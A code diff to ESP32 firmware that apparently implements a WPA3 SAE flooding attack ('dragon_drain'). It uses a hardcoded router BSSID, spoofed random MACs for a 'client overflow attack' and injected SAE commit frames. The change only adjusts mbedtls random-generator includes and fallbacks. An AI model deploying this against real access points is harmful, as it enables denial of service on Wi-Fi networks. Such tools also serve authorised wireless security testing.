@@ -47,8 +47,20 @@
 #include "esp_random.h"
 #include "mbedtls/ecp.h"
 #include "mbedtls/bignum.h"
-#include "mbedtls/private/ctr_drbg.h"
 #include "mbedtls/base64.h"
+#if defined(__has_include)
+#if __has_include("mbedtls/ctr_drbg.h")
+#include "mbedtls/ctr_drbg.h"
+#define HAS_MBEDTLS_CTR_DRBG 1
+#elif __has_include("mbedtls/private/ctr_drbg.h")
+#include "mbedtls/private/ctr_drbg.h"
+#define HAS_MBEDTLS_CTR_DRBG 1
+#else
+#define HAS_MBEDTLS_CTR_DRBG 0
+#endif
+#else
+#define HAS_MBEDTLS_CTR_DRBG 0
+#endif
 #include "esp_timer.h"
 #include "esp_app_format.h"
 
@@ -1524,7 +1536,9 @@ static int64_t start_time = 0;
 static mbedtls_ecp_group ecc_group;      // grupa ECC (secp256r1)
 static mbedtls_ecp_point ecc_element;      // bieżący element (punkt ECC)
 static mbedtls_mpi ecc_scalar;             // bieżący skalar
+#if HAS_MBEDTLS_CTR_DRBG
 static mbedtls_ctr_drbg_context ctr_drbg;
+#endif
 
 /* Router BSSID */
 static uint8_t bssid[6] = { 0x30, 0xAA, 0xE4, 0x3C, 0x3F, 0x68};
@@ -17327,8 +17341,8 @@ static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
 
 static int crypto_init(void) {
     int ret;
+#if HAS_MBEDTLS_CTR_DRBG
     const char *pers = "dragon_drain";
-
     mbedtls_ctr_drbg_init(&ctr_drbg);
 
     // TRNG as entropy source
@@ -17341,6 +17355,7 @@ static int crypto_init(void) {
         ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
         return ret;
     }
+#endif
 
     mbedtls_ecp_group_init(&ecc_group);
     mbedtls_ecp_point_init(&ecc_element);
@@ -17360,7 +17375,12 @@ static int crypto_init(void) {
  * Random MAC for client overflow attack.
  */
 static void update_spoofed_src_random(void) {
-    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
+    int ret;
+#if HAS_MBEDTLS_CTR_DRBG
+    ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
+#else
+    ret = trng_random_callback(NULL, spoofed_src, 6);
+#endif
     if (ret != 0) {
         ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
         return;
@@ -17460,7 +17480,11 @@ void inject_sae_commit_frame() {
     size_t scalar_size = 32;
 
     do {
+#if HAS_MBEDTLS_CTR_DRBG
         ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
+#else
+        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, trng_random_callback, NULL);
+#endif
         if (ret != 0) {
             ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
             return;
@@ -17475,7 +17499,11 @@ void inject_sae_commit_frame() {
     }
     pos += scalar_size;
 
+#if HAS_MBEDTLS_CTR_DRBG
     ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
+#else
+    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, trng_random_callback, NULL);
+#endif
     if (ret != 0) {
         ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
         return;
